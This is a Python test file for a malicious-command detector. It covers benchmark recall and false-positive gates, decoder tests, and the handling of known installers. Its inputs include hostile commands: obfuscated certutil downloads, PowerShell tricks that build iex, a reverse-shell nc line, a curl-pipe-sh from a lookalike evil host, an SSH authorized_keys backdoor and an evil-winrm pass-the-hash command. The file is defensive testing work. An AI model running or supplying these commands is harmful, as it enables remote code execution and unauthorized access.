"""End-to-end detection quality gate.

Runs the full pipeline (decode -> catalog match -> classify -> score) over the
labelled corpus in tests/benchmark_corpus.py and fails if recall or the
false-positive rate regresses. Individual misses are reported by
`python scripts/benchmark.py`; this test guards the aggregate so one awkward
sample cannot block a change, while a broad regression cannot slip through.
"""
from __future__ import annotations

import pytest

from app import gtfobins, lolbas, loldrivers
from app.classifier import known_installer
from app.decoder import decode_layers
from app.pipeline import detect
from tests.benchmark_corpus import ATTACKS, BENIGN, HOLDOUT_ATTACKS, HOLDOUT_BENIGN, Case

SEV_RANK = {"clean": 0, "low": 1, "notable": 2, "suspicious": 3, "malicious": 4}

MIN_RECALL = 0.95
MAX_FALSE_POSITIVE_RATE = 0.03


@pytest.fixture(scope="module", autouse=True)
def _catalogs() -> None:
    lolbas.load_catalog()
    gtfobins.load_catalog()
    loldrivers.load_catalog()
    if not lolbas._catalog:  # noqa: SLF001 — submodule not checked out
        pytest.skip("LOLBAS submodule not initialised; benchmark needs the catalogs")


def _severity(case: Case) -> str:
    return str(detect(case.command).verdict["severity"])


@pytest.mark.parametrize(
    ("name", "attacks"),
    [("tuning", ATTACKS), ("holdout", HOLDOUT_ATTACKS)],
)
def test_recall(name: str, attacks: list[Case]) -> None:
    missed = [
        f"{c.id}: got {sev}, want >= {c.tier}"
        for c in attacks
        if SEV_RANK[sev := _severity(c)] < SEV_RANK[c.tier]
    ]
    recall = 1 - len(missed) / len(attacks)
    assert recall >= MIN_RECALL, f"{name} recall {recall:.1%} < {MIN_RECALL:.0%}\n" + "\n".join(missed)


@pytest.mark.parametrize(
    ("name", "benign"),
    [("tuning", BENIGN), ("holdout", HOLDOUT_BENIGN)],
)
def test_false_positive_rate(name: str, benign: list[Case]) -> None:
    over = [
        f"{c.id}: got {sev}, want <= {c.tier}"
        for c in benign
        if SEV_RANK[sev := _severity(c)] > SEV_RANK[c.tier]
    ]
    rate = len(over) / len(benign)
    assert rate <= MAX_FALSE_POSITIVE_RATE, (
        f"{name} false-positive rate {rate:.1%} > {MAX_FALSE_POSITIVE_RATE:.0%}\n" + "\n".join(over)
    )


def test_corpus_ids_unique() -> None:
    ids = [c.id for c in (*ATTACKS, *BENIGN, *HOLDOUT_ATTACKS, *HOLDOUT_BENIGN)]
    assert len(ids) == len(set(ids))


# ── Decoders added with the benchmark ────────────────────────────────────────

def _decoded(command: str) -> dict[str, str]:
    return {str(layer["encoding"]): str(layer["value"]) for layer in decode_layers(command)}


def test_cmd_caret_stripped() -> None:
    assert "certutil -urlcache" in _decoded("c^e^r^t^u^t^i^l -u^r^l^c^a^c^h^e -f x")["cmd-caret"]


def test_cmd_in_token_quotes_removed() -> None:
    assert _decoded('certutil -url""cache -f x')["cmd-quote-split"] == "certutil -urlcache -f x"


def test_cmd_quoted_argument_untouched() -> None:
    assert decode_layers('echo "say ""hi"" now"') == []


def test_cmd_set_variables_expanded() -> None:
    layers = _decoded('cmd /c "set a=cert&& set b=util&& call %a%%b% -urlcache"')
    assert "call certutil -urlcache" in layers["cmd-variable-substitution"]


def test_cmd_substring_of_known_variable() -> None:
    assert _decoded("cmd /c %COMSPEC:~-7,3% /c whoami")["cmd-substring"] == "cmd /c cmd /c whoami"


def test_plain_set_without_use_is_not_a_layer() -> None:
    assert decode_layers("set NODE_ENV=production&& npm start") == []


@pytest.mark.parametrize("expr", [
    "$env:ComSpec[4,24,25]-join''",
    "$pshome[4]+$pshome[30]+'x'",
    "$ShellId[1]+$ShellId[13]+'x'",
])
def test_powershell_known_variable_index_spells_iex(expr: str) -> None:
    value = _decoded(f"powershell -c \".({expr}) (irm x)\"")["powershell-index"]
    assert "('iex')" in value.lower()


def test_shell_rev() -> None:
    assert _decoded("echo 'hs/nib/ e- 1 1.1.1.1 cn' | rev | sh")["shell-rev"] == "nc 1.1.1.1 1 -e /bin/sh"


def test_two_blobs_both_decoded() -> None:
    import base64

    one = base64.b64encode(b"first payload: whoami /all and more text").decode()
    two = base64.b64encode(b"second payload: net user and more text!").decode()
    values = [str(layer["value"]) for layer in decode_layers(f"run {one} then {two}")]
    assert any("first payload" in v for v in values)
    assert any("second payload" in v for v in values)


# ── Known-installer handling ─────────────────────────────────────────────────

def test_known_installer_exact_url_only() -> None:
    assert known_installer("curl -sSf https://sh.rustup.rs | sh", [])
    assert known_installer("curl -sSf https://sh.rustup.rs.evil.example/x | sh", []) is None
    assert known_installer("curl -sSf http://sh.rustup.rs | sh", []) is None


def test_known_installer_voided_by_second_stage() -> None:
    plain = detect("curl -sSf https://sh.rustup.rs | sh")
    assert plain.verdict["severity"] == "notable"
    chained = detect("curl -sSf https://sh.rustup.rs | sh; echo k >> ~/.ssh/authorized_keys")
    assert SEV_RANK[chained.verdict["severity"]] >= SEV_RANK["suspicious"]


def test_appended_help_flag_does_not_suppress() -> None:
    det = detect("evil-winrm -i 10.0.0.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0")
    assert det.verdict["severity"] == "malicious"
